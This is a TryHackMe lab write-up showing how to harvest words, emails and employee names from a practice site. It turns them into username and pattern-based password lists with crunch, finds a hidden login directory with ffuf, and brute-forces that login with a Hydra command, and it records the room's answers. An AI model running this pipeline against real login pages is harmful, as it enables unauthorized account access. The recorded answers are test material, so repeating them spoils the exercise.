# TryHackMe — Custom Wordlist Generation (Jr Penetration Tester)

> Building targeted wordlists and username lists from OSINT, then using them to brute-force a login form with Hydra.

**Room focus:** Recon → wordlist crafting → directory discovery → credential brute-forcing
**Tools:** CeWL, wget, strings, grep, awk, sort, crunch, ffuf, Hydra

---

## Overview

Generic wordlists (rockyou, common.txt) miss company- and technology-specific terms. This room is about *harvesting* target-specific words from OSINT sources, cleaning them into tidy lists, and feeding them to enumeration and brute-force tools. The payoff is a small, focused list that runs fast and hits real paths/passwords instead of a bloated generic one that wastes time.

**Analogy:** A generic wordlist is a locksmith trying every key in the world. A custom wordlist is studying the homeowner first, then cutting a handful of keys likely to fit.

---

## Environment Setup

```bash
# Resolve the lab domains
echo '<target-ip> tryfinanceme.local social.tryfinanceme.local' >> /etc/hosts
grep tryfinanceme /etc/hosts   # verify the entry landed
```

**Note on the AttackBox:** CeWL shipped broken here (v6.3.1 vs the room's 6.2.1). The `/usr/bin/cewl` wrapper couldn't load its own `cewl_lib`, and running it directly surfaced a chain of missing Ruby gems (`mini_exiftool`, `mime`). Lesson learned: **document your tool versions** — the same command on different versions produces different output, which matters for reproducibility in a real report.

---

## Phase 1 — Harvesting Words

### CeWL — spider the site for words + emails

```bash
cd /root/CeWL   # run from CeWL's own dir so Ruby finds cewl_lib
ruby cewl.rb -d 2 -m 3 --lowercase --with-numbers -e \
  --email_file ~/emails.txt -w ~/cewl_words.txt http://tryfinanceme.local
```

| Flag | Meaning |
|------|---------|
| `-d 2` | Spider 2 levels deep |
| `-m 3` | Only words 3+ characters |
| `--lowercase` | Normalize case |
| `--with-numbers` | Keep words containing digits |
| `-e` / `--email_file` | Extract emails to a file |
| `-w` | Write the wordlist |

> If CeWL is unavailable, a gem-free fallback scrapes emails from the already-downloaded site:
> ```bash
> grep -rhoiP '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' tryfinanceme.local/ | sort -u
> ```

### Download PDFs and extract strings

```bash
# Grab only PDFs from the /docs directory
wget -r -A pdf http://tryfinanceme.local/docs/

# Pull readable text out of each PDF, dropping PDF structural junk
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do
  strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt
done
```

- `strings -n 5` — extracts human-readable runs of 5+ chars from binary PDFs
- `grep -v` — *excludes* matching lines (PDF plumbing like `xref`, `endobj`)

### Extract emails and usernames from the PDFs

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
sort -u emails_docs.txt > emails_docs.unique.txt
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt   # keep the part before @
```

### Harvest employee names from the social page

```bash
curl -s http://social.tryfinanceme.local/ \
  | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt

# Build three common username formats
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt   # alex.johnson
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt  # ajohnson
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt # alexj
```

`grep -Po` with a lookbehind `(?<=...)` anchors right after the opening tag and grabs everything up to the next `<`, giving clean names.

---

## Phase 2 — Cleaning the Lists

Raw lists are messy: duplicates, mixed case, Windows carriage returns, junk tokens. Clean them so tools don't waste time.

```bash
# Merge site words + PDF words, dedupe
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt

# Normalize: lowercase → strip \r → keep well-formed 5+ char tokens → dedupe
cat words_raw.txt \
  | tr '[:upper:]' '[:lower:]' \
  | tr -d '\r' \
  | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' \
  | sort -u > words_clean.txt

wc -l words_clean.txt   # sanity-check the size
```

- `tr '[:upper:]' '[:lower:]'` — lowercase everything
- `tr -d '\r'` — strip Windows carriage returns
- `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'` — must start alphanumeric, then letters/digits/`. _ -`, 5+ chars total
- `sort -u` — final dedupe (`-u` is the flag that removes duplicate lines)

### Merge usernames

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt \
  | sort -u > users.txt
```

---

## Phase 3 — Pattern-Based Password List (crunch)

OSINT revealed Helios passwords follow the pattern `Helios20NN!`. Crunch generates every combination:

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

- `11 11` — min and max length = 11
- `-t Helios20%%!` — template; `%` = a **digit** placeholder, so `%%` = `00`–`99`
- Produces exactly 100 candidates → fast Hydra run

**Crunch template chars:** `@` = lowercase, `,` = uppercase, `%` = digit, `^` = symbol

---

## Phase 4 — Directory Discovery (ffuf)

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ
```

`FUZZ` is the injection point — ffuf swaps each wordlist entry in and reports which return real responses. This is how the hidden `helios/` directory (containing the login form) is discovered.

---

## Phase 5 — Brute-Forcing the Login (Hydra)

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 \
  tryfinanceme.local http-post-form \
  '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

| Flag | Meaning |
|------|---------|
| `-L users.txt` | Username list |
| `-P pass_helios.txt` | Password list |
| `-f` | Stop at first valid hit |
| `-V` | Verbose (print each attempt) |
| `-t 4` | 4 parallel threads |

**The `http-post-form` argument, colon-separated:**
1. `/helios/login.php` — form handler path
2. `username=^USER^&password=^PASS^` — POST body with Hydra's placeholders
3. `S=THM{` — success condition (response containing `THM{` = valid login)

When Hydra prints the `login:` / `password:` line, log in at `http://tryfinanceme.local/helios/login.php` in the browser to reveal the `THM{...}` flag.

---

## Answers Recorded

| Question | Answer | How |
|----------|--------|-----|
| Unique emails scraped by CeWL | `4` | `wc -l emails.txt` (my run showed 6 due to v6.3.1 drift) |
| PDF files found | `1` | `find tryfinanceme.local/docs -name '*.pdf' \| wc -l` |
| Emails extracted from PDFs | `4` | `wc -l emails_docs.unique.txt` |
| Last username in `users_from_emails.txt` | `security` | `tail -n 1 users_from_emails.txt` |
| Words in `words_clean.txt` | *3-digit count* | `wc -l words_clean.txt` (needs a full CeWL harvest) |
| 10th password in `pass_helios.txt` | `Helios2009!` | `sed -n '10p' pass_helios.txt` |
| Flag `sort` uses to remove duplicates | `-u` | — |
| Crunch char for a digit | `%` | — |

---

## Key Takeaways

1. **Custom > generic.** OSINT-derived wordlists hit real paths and passwords; generic lists waste cycles.
2. **The pipeline is a chain.** Each command's output file feeds the next (`wget` → `strings` → `grep` → `sort` → crunch → Hydra). Skip a step and the next one errors on a missing file.
3. **Tool versions matter.** CeWL 6.2.1 vs 6.3.1 gave different email/word counts — always note versions for reproducibility.
4. **Don't fight a broken tool.** When CeWL choked on gems, confirming the output file already existed (or scraping directly with grep) was faster than dependency whack-a-mole.
5. **Clean before you brute-force.** Lowercasing, stripping `\r`, and filtering junk keeps lists lean so ffuf/Hydra stay fast.
